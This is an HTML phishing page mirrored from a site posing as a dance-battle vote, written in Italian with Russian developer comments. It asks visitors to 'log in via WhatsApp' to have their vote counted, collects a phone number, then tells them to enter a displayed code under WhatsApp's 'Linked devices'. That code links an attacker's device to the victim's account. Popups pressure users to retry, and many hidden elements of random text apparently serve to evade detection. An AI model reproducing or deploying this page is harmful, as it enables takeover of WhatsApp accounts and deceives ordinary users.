<!DOCTYPE html>
<html lang="en"> <!-- Язык будет обновляться JS, если определен -->

<!-- Mirrored from dancebattle.life/login/zomia-it by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Apr 2025 13:02:07 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/x-icon" href="https://dancebattle.life/static/img/svg/icon.svg">
    <title data-translate-key="page.title">Autorizzazione</title> <!-- Ключ для перевода заголовка -->
    <link rel="stylesheet"
        href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
    <script
        src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
    <script
        src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
    <!-- ^^^ Файл number.js отвечает за логику выбора флага. Убедитесь, что он корректно обновляет src для img в .country .image -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>

    <style>
        .TdYmjJvmcSBa { display: none; background-color: #POsLWm; box-sizing: initial; opacity: 0.11; font-weight: 500; font-style: oblique; scale: 0.94; line-height: 12; padding: 233px; border-radius: 98px; font-size: 29px; color: #EHlSir; margin: 243px; text-align: right; cursor: text; height: 133px; width: 857px; }
        .rwvCRhgYnBx { display: none; margin: 228px; font-style: italic; color: #oFisGb; padding: 157px; height: 127px; text-align: left; font-size: 93px; background-color: #VqHDjL; border-radius: 19px; opacity: 0.88; scale: 0.52; width: 505px; }
        .EkrJRaLEYsO { display: none; font-weight: 400; border-radius: 7px; padding: 156px; margin: 230px; }
        .lmTQZiytwQd { display: none; scale: 0.94; opacity: 0.13; background-color: #mAnJXZ; }
        .TjYfSpzXTNoUdv { display: none; font-style: normal; color: #LwwJke; scale: 0.52; }
        .MEZNIyFgvRhuXN { display: none; background-color: #GoayGk; width: 67px; text-align: right; margin: 125px; font-weight: 400; box-sizing: border-box; font-style: normal; height: 133px; }
        .juxoxMAnNtukzfIm { display: none; background-color: #mAnJXZ; font-size: 27px; scale: 0.48; text-align: justify; opacity: 0.79; color: #lBnzkg; line-height: 58; height: 66px; font-style: oblique; padding: 157px; font-weight: 500; width: 983px; margin: 111px; border-radius: 52px; cursor: default; box-sizing: inherit; }
        .egeWSiccsIJQ { display: none; padding: 156px; height: 733px; margin: 59px; border-radius: 52px; line-height: 58; box-sizing: initial; width: 535px; font-size: 44px; scale: 0.48; font-weight: 800; font-style: initial; color: #LzmaFZ; text-align: initial; opacity: 0.94; cursor: auto; }
        .RdMuchDHj { display: none; line-height: 34; font-weight: 800; color: #xNbkxJ; text-align: inherit; }
        .phjUabQT { display: none; color: #oFisGb; width: 231px; scale: 0.48; height: 586px; font-style: oblique; cursor: grab; font-size: 90px; border-radius: 19px; line-height: 8; background-color: #GoayGk; margin: 228px; padding: 105px; }
        .CUuwPmBOQqkLDnR { display: none; height: 325px; font-size: 90px; background-color: #pJihnh; cursor: pointer; scale: 0.6; font-style: italic; font-weight: 500; color: #oFisGb; width: 231px; text-align: justify; margin: 111px; padding: 65px; }
        .QSXSXYDCnbqkFWy { display: none; width: 14px; background-color: #dXDFTp; }
        .zFFCQoOq { display: none; margin: 243px; line-height: 32; font-size: 93px; text-align: right; cursor: move; padding: 156px; font-weight: 600; font-style: oblique; border-radius: 32px; height: 262px; color: #toGUJC; }
        .HJCjuJdBRxyFkVhn { display: none; font-size: 27px; text-align: right; padding: 152px; height: 586px; scale: 0.51; margin: 243px; font-style: oblique; width: 535px; color: #EHlSir; box-sizing: border-box; font-weight: 500; cursor: not-allowed; opacity: 0.11; background-color: #dXDFTp; line-height: 8; border-radius: 57px; }
        body { background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); background-color: #ffffff; }
        .loader {
            /* Базовые стили лоадера из вашего CSS или number.css. Убедитесь, что они тут есть, или в number.css */
            /* Например: */
             width: 30px;  
             height: 30px; 
             border-radius: 50%;
             border: 5px solid #f3f3f3; /* Цвет фона круга */
            /* ----- КОНЕЦ ПРИМЕРА */
            border-top: 5px solid #bfbbbb; /* Это было в вашем HTML, цвет активной части */
            /* Для анимации вращения, если она есть в number.css: */
            animation: spin 1s linear infinite; /* Добавил анимацию */
        }
        @keyframes spin { /* Добавил анимацию */
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }

        .block.number .form .search { background-color: #ffffff; }
        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb { background: #152b42; }
        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb:hover { background: #152b42; }
        .popup h2, .block .text { color: #ffffff; }
        .popup p, .block .text p { color: #c6c6c6; }
        .button.primary { color: #ffffff; background-color: #1d9ce0E6; width: 100% !important; }
        .button.primary:hover { background-color: #1d9ce0; }
        .code-title { font-size: 26px; font-weight: 700; }
        .block.number .form-container { background-color: #1d3957; }
        .block.number .form-container .form .country { border: 1px solid #80a2b3; }
        /* Следующие два правила важны для отображения флагов */
        .block.number .form-container .form .country .image img { -webkit-mask-image: none !important; mask-image: none !important; }
        .block.number .form-container .form .countries .item .image img { -webkit-mask-image: none !important; mask-image: none !important; }
        .block.number .form-container .form .country.active { border: 1px solid #1d9ce0; }
        .block.number .form-container .form .country p { color: #ffffff; }
        .block.number .form-container .form .country .icon svg path { fill: #bfbbbb; }
        .block.number .form-container .form .countries { background-color: #1d3957; }
        .block.number .form-container .form .countries .search { background-color: #1d3957; }
        .top40 .body{ top: 40%; }
        .block.number .form-container .form .countries .search input { color: #b1c1d1; background-color: #152b42; }
        .block.number .form-container .form .countries .items { background-color: #1d3957; }
        .block.number .form-container .form .countries .item { background-color: #1d3957; }
        .block.number .form-container .form .countries .item:hover { background-color: #24466b; }
        .block.number .form-container .form .countries .item p.name { color: #b1c1d1; }
        .block.number .form-container .form .countries .item p.code { color: #ffffff; }
        .block.number .form-container .form .qrcode { color: #1d9ce0; }
        .block.number .form-container .form input.number { color: #ffffff; background-color: transparent; border: 1px solid #80a2b3; }
        .block.number .form-container .form input.number:focus { border: 1px solid #1d9ce0; }
        .block.number .form-container .form p.error { color: #d65d7a; }
        .block.code .number-container { border: 20px solid #1d3957; background-color: #ffffff; text-align: center; /* Чтобы лоадер был по центру */ }
        .popup .body { background-color: #1d3957; }

        @media screen and (max-width: 768px) {
            .block.code .number-container .loader { /* Специфичный селектор для надежности */
                width: 60px;  /* Новая ширина для мобильных */
                height: 60px; /* Новая высота для мобильных */
                border-width: 7px; /* Увеличиваем толщину линии, если border задан для всех сторон */
                                    /* Если у лоадера только border-top имеет цвет, то: */
                                    /* border-top-width: 7px; */
                margin: 20px auto; /* Центрирование лоадера внутри .number-container */
            }
            .block.code .number-container { border: 10px solid #1d3957; }
        }
    </style>
</head>
<body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
    <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
        hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
    <div class="wrapper">
        <!-- 
            По поводу "прыжка" формы при переключении:
            Это чаще всего связано с изменением общей высоты контента при смене шагов.
            Возможные CSS-решения:
            1. Задать .wrapper или общему контейнеру для форм (id="step-1", id="step-2")
               минимальную высоту (min-height), достаточную для самого высокого шага.
            2. Использовать CSS-переходы/анимации для более плавного скрытия/показа,
               но это более сложная задача, если высота сильно меняется.
            Текущий JS просто меняет display, что является стандартным поведением.
        -->
        <span class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
            <div class="btBTGkttju">
                <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
            </div>
        </span>
        <div class="block number" id="step-1">
            <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
                <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
                    QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge QQKAHgQeFpjdWgu
                    ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
            </small>
            <div class="text">
                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>

                <h2 data-translate-key="form1.title">Devi accedere tramite WhatsApp affinché il tuo voto venga preso in considerazione.</h2>
                <small
                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
                </small>
                <span
                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
                    <div class="btBTGkttju">
                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
                    </div>
                </span>
                <h5
                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
                <p data-translate-key="form1.description">L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
                <span
                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
                    <div class="btBTGkttju">
                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
                    </div>
                </span>
                <h5
                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
            </div>
            <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
                hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
            <div id="form-step-1" class="form-container form-num">

                <div class="form" id="myForm">
                    <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">KeufuQduGbyIESnJxdKC
                        hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY WsLTZhNoKjWIykQojN
                        LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
                    <div class="country"> <!-- Этот блок обновляется JS (number.js или intlTelInput) при выборе страны -->
                        <div class="image">
                            <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
                                alt="AU">
                        </div>
                        <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
                            <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
                                QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge
                                QQKAHgQeFpjdWgu ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
                        </small>
                        <p class="name">Australia</p>
                        <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
                            KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY
                            WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
                        <div class="icon">
                            <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class=""
                                fill="none">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor"
                                    fill-opacity="0.3"></path>
                            </svg>
                        </div>
                        <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                            <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN
                                ZFIDaGgBq PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
                        </span>
                    </div>
                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                    <div class="countries hidden"> <!-- Этот блок показывается/скрывается JS (number.js) -->
                        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI
                            QZhWtdNh</strong>
                        <div class="search">
                            <h5
                                class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
                                xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
                            <div class="image">
                                <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet"
                                    class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
                                    <path fill="#bfbbbb"
                                        d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z">
                                    </path>
                                </svg>
                            </div>
                            <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
                                lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                            <input type="text" id="search" data-translate-key="form1.searchPlaceholder" placeholder="Search..."> 

                        </div>
                        <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
                            lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                        <div class="items">
                            <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
                                KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX
                                JxoZektYrbHlY WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc
                                EnxoxcmjcpyZygdOuwbVkt</ul>
                            <div class="overflow">
                                <!-- *** СПИСОК СТРАН С ФЛАГАМИ (КАК В ВАШЕМ ПРИМЕРЕ) *** -->
                                <!-- Вставьте сюда полный список стран из вашего исходного HTML -->
                                <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
                                <div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
                                <!-- ... и так далее для всех стран ... -->
                                <div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
                                <!-- *** КОНЕЦ СПИСКА СТРАН *** -->
                            </div>
                            <ul class="egeWSiccsIJQ SCLYYYcSeAF qaeFHqJVbGDfsBGDGrdnjSCK jOlNkfIrteJgkl">
                                <h5 class="kvIpScpLemN">ITmVeZdXJDSCBWl zVbKqQUbIoZBZzyyzo DCbunYKAbrsFUv SygnOVnIsOj
                                </h5>
                            </ul>
                        </div>
                        <h5
                            class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
                            xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
                    </div>
                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
                    </span>
                    <input type="text" class="number" id="number" value="+61" /> <!-- Этот input обновляется из intl-tel-input или number.js -->
                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
                    </span>
                    <button class="button primary" id="next-step" data-translate-key="form.continueButton">Continua</button>

                    <span
                        class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
                        <div class="btBTGkttju">
                            <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
                        </div>
                    </span>
                    <p class="error hidden" data-translate-key="form1.error.invalidNumber">Numero di telefono non valido</p>
                    <small
                        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
                        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
                    </small>
                    <!-- Этот блок был в вашем коде, оставляю его. Убедитесь, что его логика вам нужна. -->
                    <div id="verifyForm" style="display: none; margin-top: 20px;">
                        <input type="text" id="codeInput" data-translate-key="form1.verifyCodePlaceholder" placeholder="Введіть код">
                        <button id="submitCode" data-translate-key="form1.verifySubmitButton">Підтвердити</button>
                    </div>
                </div>
                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
            </div>
        </div> <!-- Конец div#step-1 -->

        <h5
            class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
            ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi
        </h5>
        <div class="block code hidden" id="step-2"> <!-- Этот блок изначально скрыт, показывается JS -->
            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
            </span>
            <div class="text">
                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>

                <h2 data-translate-key="form2.title">Autorizzazione rapida e facile tramite WhatsApp</h2>

                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
                <input type="hidden" id="user-number">
                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>

                <p data-translate-key="form2.description">Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle
                    impostazioni, quindi inserisci questo codice</p>

                <h5
                    class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
                    xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>

                <small
                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
                </small>
            </div>

            <div class="number-column">
                <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">lNJFwMkFeieFVsR
                    YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                <div class="number-container" id="loader-container"> <!-- Контейнер для лоадера и кода -->
                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                    <div class="loader" style="display: none;"></div> <!-- Лоадер, изначально скрыт, управляется JS -->

                    <!-- Этот блок с символами кода number-code, если он вам нужен, будет показываться JS -->
                    <div class="number-code hidden" id="number-code" data-code="">
                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                        <div class="split">–</div>
                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                    </div>
                    <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
                        <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
                            GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
                    </div>
                </div>

                <!-- Форма для ввода кода -->
                <div id="form-step-2-container" class="form-container form-code" style="display: none;"> <!-- Изначально скрыта, показывается JS -->
                    <p class="text code-title" data-translate-key="form2.codeLabel">Code:</p>
                    <div class="form" id="form-code">
                        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                        <input type="text" class="number" id="code" data-translate-key="form2.codePlaceholder" placeholder="Enter code"/>
                        <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                            <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                                PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
                        </span>
                        <button class="button primary" id="two-step" data-translate-key="form.continueButton">Continua</button>
                    </div>
                </div>
                <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
                    <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
                        GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
                </div>
                <div class="button primary hidden" id="copy-code" data-translate-key="form2.copyButton">Copia</div> <!-- Если нужна кнопка копирования -->
            </div>
        </div> <!-- Конец div#step-2 -->

        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI QZhWtdNh</strong>
    </div> <!-- Конец div.wrapper -->
    <small
        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
    </small>
    <div class="popup top40" id="popreboot" style="display: none;"> <!-- Изначально скрыт, управляется JS -->
        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
        <div class="body">
            <h2 data-translate-key="popup.reboot.title">Your vote has been counted, thank you</h2>
            <button class="button primary btn-ok" id="btn-ok-reboot" data-translate-key="popup.reboot.button">Ok</button> <!-- Изменен ID -->
            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
        </div>
        <small
            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
        </small>
    </div>

    <div class="popup top40" id="popwhat" style="display: none;"> <!-- Изначально скрыт, управляется JS -->
        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
        <div class="body">
            <h2 data-translate-key="popup.what.title">Something is wrong!</h2>
            <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP WFFhTuDduNDAMMCnWt
                MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK HMnrMFReAPNuUAFJVUhthI
                CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
            <p data-translate-key="popup.what.paragraph">You entered the code incorrectly, go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.</p>
            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
